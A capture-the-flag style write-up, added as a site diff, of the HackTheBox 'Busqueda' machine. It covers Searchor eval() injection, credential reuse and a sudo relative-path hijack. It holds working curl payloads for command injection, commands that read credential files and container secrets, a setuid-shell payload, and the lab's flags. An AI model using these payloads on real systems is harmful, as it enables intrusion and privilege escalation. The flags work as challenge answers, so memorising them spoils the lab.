@@ -1,0 +1,343 @@
+---
+slug: "htb-busqueda"
+title: "Busqueda — HackTheBox Machine Writeup"
+date: "2026-08-03"
+platform: "HackTheBox"
+type: "Machine"
+category: "Web"
+os: "Linux"
+difficulty: "Easy"
+tags:
+  - "Web"
+  - "Flask"
+  - "Searchor"
+  - "Eval Injection"
+  - "Credential Reuse"
+  - "Sudo Misconfiguration"
+  - "Linux"
+excerpt: "An Easy Linux box that starts with an eval() injection in Searchor 2.4.0 behind a Flask app, leads to credential harvesting from a leaked .git/config, and ends with a relative-path hijack of a sudo-run system script."
+readTime: "15 min"
+rating: 4.7
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/htb-busqueda"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Analysis",
+      title: "Recon a Flask search proxy",
+      desc: "Port scan reveals SSH + HTTP. The web app is a search proxy powered by Flask and Searchor 2.4.0, whose eval()-based query builder is known to be injectable.",
+      tools: ["nmap", "curl"],
+    },
+    {
+      phase: "Exploitation",
+      title: "RCE via Searchor eval() injection",
+      desc: "The POST /search endpoint splices the query into an eval() string. A popen() payload yields command execution as svc, which we use to leak credentials from the app's .git/config and pivot to SSH.",
+      technique: "Python eval() Command Injection",
+      tools: ["curl", "paramiko"],
+    },
+    {
+      phase: "Escalation",
+      title: "Relative-path hijack of a sudo script",
+      desc: "svc may run /opt/scripts/system-checkup.py as root. Its full-checkup action executes ./full-checkup.sh with a relative path, so a planted payload in the CWD runs as root and drops a setuid shell.",
+      technique: "Relative Working Directory Hijack",
+      tools: ["sudo", "bash"],
+    },
+  ]}
+/>
+
+## Challenge Overview
+
+Busqueda is a clean, well-paced Easy box: a single vulnerable web library (Searchor 2.4.0) gives command execution; a leaked git remote URL inside the deployed app leaks credentials; and those credentials are reused for SSH and sudo, ultimately letting a relative-path invocation of a root-only script drop a setuid shell. No kernel tricks, no binary exploitation — just configuration mistakes and a famous eval() antipattern.
+
+<Callout type="info">
+Beginner note: the whole box is a chain of "trust" mistakes — passing attacker input into eval(), committing credentials into a git remote URL, and reusing that same password everywhere. Keep a notepad of every credential you find; on this box they all interlock.
+</Callout>
+
+
+## Enumeration & Web Application Recon
+
+A full-port scan with service detection comes back clean:
+
+```text
+$ nmap -p- -sCV 10.129.53.77
+PORT   STATE SERVICE    VERSION
+22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu
+80/tcp open  http       Apache httpd 2.4.52
+```
+
+Browsing to the IP redirects to `http://searcher.htb/`, so the target uses virtual hosts. Adding the box's hostnames to `/etc/hosts`:
+
+```bash
+echo "10.129.53.77 searcher.htb gitea.searcher.htb" | sudo tee -a /etc/hosts
+```
+
+The home page is a search form with a huge engine dropdown. Two details in the page stand out immediately:
+
+- The footer: **"Powered by Flask and Searchor 2.4.0"**
+- The `Server: Werkzeug/2.1.2 Python/3.10.6` header
+
+```text
+$ curl -sI http://searcher.htb
+HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.6
+```
+
+Searchor is a PyPI package that builds engine search URLs. Version 2.4.0 has a notorious flaw: the CLI and library build the search call via `eval()` on a format string, and both the engine and the query are interpolated unescaped.
+
+<Callout type="warning">
+Any version of Searchor before 2.4.2 is vulnerable. The patch (2.4.2) replaced the eval()-based URL builder with an explicit dictionary lookup — a textbook case of "eval is not a templating engine".
+</Callout>
+
+## The Searchor 2.4.0 eval() Injection
+
+<Callout type="info">
+  We cover source code auditing techniques, dangerous dynamic code evaluation patterns (`eval()`, `popen()`), and parameter handling in full detail in our article: **[Source Code Review: Unearthing Critical Flaws in PHP](/logs/php-code-review)**.
+</Callout>
+
+The vulnerable code in `src/searchor/main.py` looks roughly like this:
+
+```python
+# searchor == 2.4.0 (vulnerable)
+url = eval(
+    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
+)
+```
+
+The server-side application takes the user's `query` and passes it straight into that string. Because the query is wrapped in single quotes, a payload of the form
+
+```text
+' + __import__('os').popen('id').read() + '
+```
+
+breaks out of the quoted string, evaluates as Python, and concatenates the command's stdout into the search URL. The app then renders that URL back in the response — which conveniently gives us a read channel for command output.
+
+### Proof of Concept
+
+```bash
+curl -s -X POST http://searcher.htb/search \
+  --data-urlencode "engine=GitHub" \
+  --data-urlencode "query=' + __import__('os').popen('id').read() + '"
+```
+
+The response is a GitHub search URL with our command output URL-encoded inside it:
+
+```text
+https://www.github.com/search?q=uid%3D1000%28svc%29%20gid%3D1000%28svc%29%20groups%3D1000%28svc%29%0A
+```
+
+Decoded: `uid=1000(svc) gid=1000(svc) groups=1000(svc)` — arbitrary command execution as the `svc` user.
+
+## Credential Harvesting via RCE
+
+With a command channel, the first stop is the deployed app's own git history and configuration. The web root is `/var/www/app`:
+
+```bash
+curl -s -X POST http://searcher.htb/search \
+  --data-urlencode "engine=GitHub" \
+  --data-urlencode "query=' + __import__('os').popen('cat /var/www/app/.git/config').read() + '"
+```
+
+The leaked `.git/config` contains a remote URL with embedded credentials:
+
+```ini
+[remote "origin"]
+    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+```
+
+A classic credential-in-URL leak. The password belongs to a gitea user `cody`. Rather than fighting the RCE for a stable shell, I tested the same password against SSH — and the box reused it for the `svc` account:
+
+<Callout type="info">
+  We cover local credential harvesting methodology, secrets extraction (`.git/config`, `.env`, process environments), and user enumeration in depth in our **[Linux Privilege Escalation: Enumeration Cheatsheet](/cheatsheet/linux/privesc-enumeration)**.
+</Callout>
+
+```bash
+ssh svc@searcher.htb          # password: jh1usoih2bkjaspwe92
+```
+
+```text
+svc@busqueda:~$ id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+svc@busqueda:~$ cat /home/svc/user.txt
+0a5428....4c64751d
+```
+### User flag
+
+<SpoilerFlag flag="0a5428f746ba32fd7b3b98244c64751d" label="user.txt" />
+
+## Privilege Escalation — Relative-Path Hijack
+
+### Checking sudo rights
+
+```text
+svc@busqueda:~$ sudo -l
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+`svc` can run one specific script as root — but only that exact interpreter invocation. The script itself is not readable (`-rwx--x--x`), so I pulled its source from the Gitea instance instead, using the `administrator` account on `gitea.searcher.htb`. The Gitea database password comes from inspecting the `gitea` docker container via the same sudo script:
+
+```bash
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py \
+  docker-inspect '{{range .Config.Env}}{{printf "%s\n" .}}{{end}}' gitea
+```
+
+```text
+GITEA__database__DB_TYPE=mysql
+GITEA__database__HOST=db:3306
+GITEA__database__NAME=gitea
+GITEA__database__USER=gitea
+GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
+```
+
+That password logs into Gitea as `administrator`, and the `administrator/scripts` repo contains the source of `system-checkup.py`. The interesting branch:
+
+```python
+elif action == 'full-checkup':
+    try:
+        arg_list = ['./full-checkup.sh']
+        print(run_command(arg_list))
+        print('[+] Done!')
+    except:
+        print('Something went wrong')
+        exit(1)
+```
+
+The bug: `./full-checkup.sh` is a **relative** path. The script never changes into `/opt/scripts` and never resolves the path against the script's own directory — it inherits the current working directory of whoever invokes it. So if I run `sudo ... system-checkup.py full-checkup` from a directory I control, the root process executes *my* `full-checkup.sh`.
+
+<Callout type="tip">
+This is the same class of bug as PATH hijacking, but for the working directory instead of PATH: the program trusts an environment-derived location (the CWD) instead of anchoring to an absolute path. Running sudo from /tmp is all it takes.
+
+We cover relative PATH/CWD hijacking, `sudo` environment abuse, and GTFOBins setuid escapes fully in our **[Linux Privilege Escalation: Basics & Exploitation Cheatsheet](/cheatsheet/linux/privesc-exploitation)**.
+</Callout>
+
+### Crafting the payload
+
+```bash
+svc@busqueda:/tmp$ cat > full-checkup.sh << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/bb
+chmod u+s /tmp/bb
+EOF
+svc@busqueda:/tmp$ chmod +x full-checkup.sh
+
+svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+[+] Done!
+
+svc@busqueda:/tmp$ ls -l /tmp/bb
+-rwsr-xr-x 1 root root 1396520 Aug  3 09:08 /tmp/bb
+```
+
+The sudo invocation ran from `/tmp`, so `./full-checkup.sh` resolved to my payload, which ran as root and copied `/bin/bash` into a setuid binary. Executing it with preserved privileges gives an euid-0 shell:
+
+```text
+svc@busqueda:/tmp$ /tmp/bb -p
+bb-5.1# id
+uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root)
+```
+
+## Verification & Proof of Work
+
+Two independent confirmations of the root shell:
+
+1. **File ownership check** — `/tmp/bb` shows `-rwsr-xr-x 1 root root`, proving the copy ran with root privileges (a non-root copy would show owner `svc`).
+2. **euid inspection** — `id` from inside the setuid shell reports `euid=0(root) egid=0(root)` while the real uid stays `1000`; bash only honors the setuid bit with `-p` and reports it via `euid`, which is exactly what we observe.
+
+```text
+# cat /root/root.txt
+056cb7d1...c485bd64e2
+```
+
+### Root flag
+
+<SpoilerFlag label="root.txt" flag="056cb7d1974e1c6ac67f76c485bd64e2" />
+
+## Autosolve
+
+The whole chain is scriptable end-to-end: the RCE gives us the credentials, the credentials give us SSH, and SSH gives us the sudo abuse. `autosolve/htb_busqueda_solve.py` runs it in six steps with no hardcoded secrets — everything is harvested off the live target.
+
+<TerminalReplay
+  title="htb_busqueda_solve.py"
+  flags={[
+    { label: "user.txt", flag: "0a5428f746ba32fd7b3b98244c64751d" },
+    { label: "root.txt", flag: "056cb7d1974e1c6ac67f76c485bd64e2" },
+  ]}
+  flagSummary={[
+    "Harvested Gitea credentials from .git/config via Searchor 2.4.0 eval() injection.",
+    "Pivoted to SSH as svc via password reuse.",
+    "Abused relative ./full-checkup.sh execution in sudo system-checkup.py for euid=0 root shell.",
+  ]}
+  steps={[
+    {
+      label: "Step 1/6 — Probe Searchor eval() RCE",
+      command: "python3 autosolve/htb_busqueda_solve.py 10.129.53.77",
+      output: [
+        { text: ">> TARGET: 10.129.53.77", color: "blue" },
+        { text: "[1/6] RCE on Searchor (eval injection)", color: "blue" },
+        { text: "      id -> uid=1000(svc) gid=1000(svc) groups=1000(svc)", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 2/6 — Leak git config credentials",
+      output: [
+        { text: "[2/6] Harvest .git/config creds", color: "blue" },
+        { text: "    (config snippet) [core] | repositoryformatversion = 0 | [remote \"origin\"] | url = http://cody:jh1usoih2bkjaspwe92", color: "magenta" },
+        { text: "    credentials: cody : jh1usoih2bkjaspwe92", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 3/6 — SSH as svc via password reuse",
+      output: [
+        { text: "[3/6] SSH as svc (reused password)", color: "blue" },
+        { text: "    uid=1000(svc) gid=1000(svc) groups=1000(svc)", color: "green" },
+        { text: "    user.txt: 0a5428f746ba32fd7b3b98244c64751d", color: "magenta" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 4/6 — Plant setuid payload in /tmp",
+      output: [
+        { text: "[4/6] Drop setuid-shell payload", color: "blue" },
+        { text: "    wrote /tmp/full-checkup.sh -> cp /bin/bash /tmp/bb; chmod u+s", color: "green" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 5/6 — Trigger sudo script relative hijack",
+      output: [
+        { text: "[5/6] sudo system-checkup.py full-checkup (relative-path hijack)", color: "blue" },
+        { text: "    [+] Done!", color: "green" },
+        { text: "    -rwsr-xr-x 1 root root 1396520 Aug  3 09:08 /tmp/bb", color: "magenta" },
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 6/6 — Read root flag from setuid shell",
+      output: [
+        { text: "[6/6] Execute setuid shell, read root flag", color: "blue" },
+        { text: "    root.txt: 056cb7d1974e1c6ac67f76c485bd64e2", color: "magenta" },
+      ],
+      delayAfter: 0,
+    },
+  ]}
+/>
+
+<Callout type="tip">
+  **Standalone Solver Script:** View or run the complete automated solver
+  [`htb_busqueda_solve.py`](https://github.com/Asbawy/Asbawy.github.io/blob/main/autosolve/htb_busqueda_solve.py)
+  in our [`/autosolve`](https://github.com/Asbawy/Asbawy.github.io/tree/main/autosolve) directory.
+</Callout>
+
+## References
+
+- [Searchor (ArjunSharda) — the vulnerable package](https://github.com/ArjunSharda/Searchor)
+- [HackTricks — eval()/RCE via Python injection](https://book.hacktricks.wiki/en/pentesting-web/python/)
+- [GTFOBins — setuid shell escapes](https://gtfobins.github.io/)
+- [Flask — request routing & Host-header behavior](https://flask.palletsprojects.com/)
